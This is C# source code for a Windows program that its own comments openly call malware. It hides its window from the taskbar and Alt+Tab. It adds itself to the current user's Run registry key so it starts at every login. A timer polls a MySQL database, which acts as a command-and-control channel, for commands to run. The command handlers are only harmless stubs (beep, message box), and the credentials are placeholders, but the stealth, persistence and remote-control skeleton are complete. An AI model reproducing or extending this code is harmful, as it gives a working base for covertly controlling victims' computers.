using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using MySql.Data.MySqlClient;

namespace fff
{
    public partial class rr : Form
    {
        public string connectionString = "Server=SERVER;Database=DBNAME;Uid=USERNAME;Pwd=PASSWORD;";

        [DllImport("user32.dll")]
        private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        private const int GWL_EXSTYLE = -20;
        private const int WS_EX_TOOLWINDOW = 0x00000080;
        public rr()
        {
            InitializeComponent();
            SetBackgroundForm();
        }

        private void SetBackgroundForm()
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.None;
            SetToolWindow(this.Handle); // Hiding malware from taskbar and ALT+TAB by making it a background proc
        }

        private void SetToolWindow(IntPtr handle)
        {
            int exStyle = GetWindowLong(handle, GWL_EXSTYLE);
            exStyle |= WS_EX_TOOLWINDOW;
            SetWindowLong(handle, GWL_EXSTYLE, exStyle);
        }

        private void rr_Load(object sender, EventArgs e)
        {
            MySqlConnection conn = new MySqlConnection(connectionString);

            try
            {
                conn.Open();

                Console.Beep(500, 500);

                conn.Close();
            }
            catch (Exception ex)
            {
                //
            }

            string an = "fff"; // APP NAME
            string ap = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "EXECUTABLE.EXE"); // Adding malware to startup using reg edit

            if (!isp(an, ap))
            {
                ats(an, ap);
            }
            else
            {
                Console.Beep(500, 500);
            }
        }

        static void ats(string appName, string appPath)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue(appName, appPath);
            }
        }

        static bool isp(string appName, string appPath)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                return key.GetValue(appName) != null && key.GetValue(appName).ToString() == appPath;
            }
        }

        private void cdc()
        {
            MySqlConnection conn = new MySqlConnection(connectionString);

            try
            {
                conn.Open();

                string sqlQuery = "SELECT column FROM table ORDER BY id DESC LIMIT 1";

                MySqlCommand cmd = new MySqlCommand(sqlQuery, conn);

                object result = cmd.ExecuteScalar();

                if (result != null && result != DBNull.Value)
                {
                    string command = result.ToString();

                    switch (command.ToLower())
                    {
                        case "clear":
                            break;
                        case "beep":
                            Console.Beep(500, 500);
                            break;
                        case "message":
                            MessageBox.Show("Hello, world!", "Message");
                            break;
                        default:
                            Console.WriteLine("Unknown command: " + command);
                            break;
                    }
                }

                conn.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                conn.Close();
            }
        }


        private void cc_Tick(object sender, EventArgs e)
        {
            cdc();
        }
    }
}
